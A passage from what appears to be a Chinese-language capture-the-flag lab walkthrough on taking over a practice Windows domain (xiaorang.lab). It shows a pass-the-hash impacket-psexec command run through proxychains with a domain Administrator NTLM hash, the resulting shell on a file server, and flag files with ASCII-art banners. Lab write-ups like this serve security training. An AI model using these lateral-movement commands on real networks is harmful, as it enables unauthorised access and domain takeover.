<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> ______   _______  _        _______  _______  _______ __________________ _______  _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(__  \ (  ____ \( \      (  ____ \(  ____ \(  ___)\__   __/\__   __/(  ___  )( (    /|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| (\)| (    \/| (      | (    \/| (    \/| (   ) |   ) (      ) (   | (   ) ||  \  ( |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| |   ) || (__    | |      | (__    | |      | (___) |   | |      | |   | |   | ||   \ | |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| |   | ||  __)   | |      |  __)   | | ____ |  ___  |   | |      | |   | |   | || (\ \) |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| |   ) || (| |      | (      | | \_)| (   ) |   | |      | |   | |   | || | \   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| (__/)| (____/\| (____/\| (____/\| (___) || )   ( |   | |   ___) (___| (___) || )  \  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(______/ (_______/(_______/(_______/(_______)|/     \|   )_(   \_______/(_______)|/    )_)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Awesome! Now you have taken over the entire domain network.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag04: flag{6f4333a1-eed5-4bb4-9b6f-abdf55d0f67e}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="17222419-fileserverxiaoranglab-域内横向">172.22.4.19 FILESERVER.xiaorang.lab 域内横向<a href="#17222419-fileserverxiaoranglab-域内横向" class="hash-link" aria-label="172.22.4.19 FILESERVER.xiaorang.lab 域内横向的直接链接" title="172.22.4.19 FILESERVER.xiaorang.lab 域内横向的直接链接">​</a></h2>
<p>既然已经有了域内 Administrator 的凭据，直接拿下剩下的靶机即可</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/pocs</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> impacket-psexec xiaorang/Administrator@172.22.4.19 </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> :4889f6553239ace1f7c47fa2c619c252 </span><span class="token parameter variable" style="color:#36acaa">-codec</span><span class="token plain"> gbk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.12.0.dev1 - Copyright </span><span class="token number" style="color:#36acaa">2023</span><span class="token plain"> Fortra</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Requesting shares on </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Found writable share ADMIN$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Uploading </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> lUcduVKW.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Opening SVCManager on </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Creating </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> TUsH on </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Starting </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> TUsH</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Press </span><span class="token builtin class-name">help</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> extra shell commands</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft Windows </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">版本 </span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain">.14393</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2016</span><span class="token plain"> Microsoft Corporation。保留所有权利。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system3</span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> C:/Users/Administrator/flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Administrator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">flag</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">type</span><span class="token plain"> flag03.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain">       </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain">       </span><span class="token builtin class-name">.</span><span class="token plain">         </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain">       </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain">       </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain">       </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain">    </span><span class="token builtin class-name">.</span><span class="token plain">    </span><span class="token builtin class-name">.</span><span class="token plain">       </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain">       </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.+</span><span class="token string" style="color:#e3116c">&#x27;|=|`+. .+&#x27;</span><span class="token operator" style="color:#393A34">|</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+. .+</span><span class="token variable string" style="color:#e3116c">&#x27;|      .+&#x27;</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+. .+</span><span class="token string" style="color:#e3116c">&#x27;|=|`+. .+&#x27;</span><span class="token operator" style="color:#393A34">|</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+. .+&#x27;</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+.</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+. </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+. .+</span><span class="token string" style="color:#e3116c">&#x27;|=|`+. .+&#x27;</span><span class="token operator" style="color:#393A34">|</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+.</span><br></span><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa"></span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+.</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">      </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+.</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+.</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">.+&#x27; </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+.</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+ </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa"></span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token builtin class-name">.</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable builtin class-name" style="color:#36acaa">.</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable builtin class-name" style="color:#36acaa">.</span><span class="token variable" style="color:#36acaa">    </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">      </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">      </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa"></span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token builtin class-name">.</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable builtin class-name" style="color:#36acaa">.</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+. </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">    </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">    </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">    </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable builtin class-name" style="color:#36acaa">.</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">      </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">      </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa"></span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> .+ </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> .+</span><span class="token variable string" style="color:#e3116c">&#x27;| |  | .+&#x27;</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> .+&#x27;</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> .+ </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">      </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">      </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">  </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa"></span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+.</span><span class="token operator" style="color:#393A34">|</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">.+</span><span class="token string" style="color:#e3116c">&#x27;`+.|=|.+&#x27;</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+.</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">.+&#x27;</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+.</span><span class="token operator" style="color:#393A34">|</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">.+</span><span class="token string" style="color:#e3116c">&#x27; `+.|=|.+&#x27;</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable" style="color:#36acaa">+.</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable punctuation" style="color:#393A34">..</span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">      </span><span class="token variable operator" style="color:#393A34">|</span><span class="token variable" style="color:#36acaa">.+</span><span class="token variable string" style="color:#e3116c">&#x27;      |.+&#x27;</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain">+.</span><span class="token operator" style="color:#393A34">|</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">.+&#x27; `+.</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token builtin class-name">.</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag03: flag</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">0183dc6b-9724-47a8-a32b-8a06f4ea0ef6</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Here is fileserver.xiaorang.lab, you might </span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> something interesting on this </span><span class="token function" style="color:#d73a49">host</span><span class="token plain"> that can </span><span class="token builtin class-name">help</span><span class="token plain"> you</span><span class="token operator" style="color:#393A34">!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag---03">flag - 03<a href="#flag---03" class="hash-link" aria-label="flag - 03的直接链接" title="flag - 03的直接链接">​</a></h2>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">   . .       . .       .         . .       . .       . .       . .    .    .       . .       . .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.+&#x27;|=|`+. .+&#x27;|=|`+. .+&#x27;|      .+&#x27;|=|`+. .+&#x27;|=|`+. .+&#x27;|=|`+. .+&#x27;|=|`+.=|`+. |`+. .+&#x27;|=|`+. .+&#x27;|=|`+.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|  | `+ | |  | `+.| |  |      |  | `+.| |  | `+.| |  | |  | |.+&#x27; |  | `+.| |  | |  | |  | |  | `+ |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|  |  | | |  |=|`.  |  |      |  |=|`.  |  | .    |  |=|  |      |  |      |  | |  | |  | |  |  | |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|  |  | | |  | `.|  |  |      |  | `.|  |  | |`+. |  | |  |      |  |      |  | |  | |  | |  |  | |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|  |  | | |  |    . |  |    . |  |    . |  | `. | |  | |  |      |  |      |  | |  | |  | |  |  | |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|  | .+ | |  | .+&#x27;| |  | .+&#x27;| |  | .+&#x27;| |  | .+ | |  | |  |      |  |      |  | |  | |  | |  |  | |</span><br></span><span class="token-line" 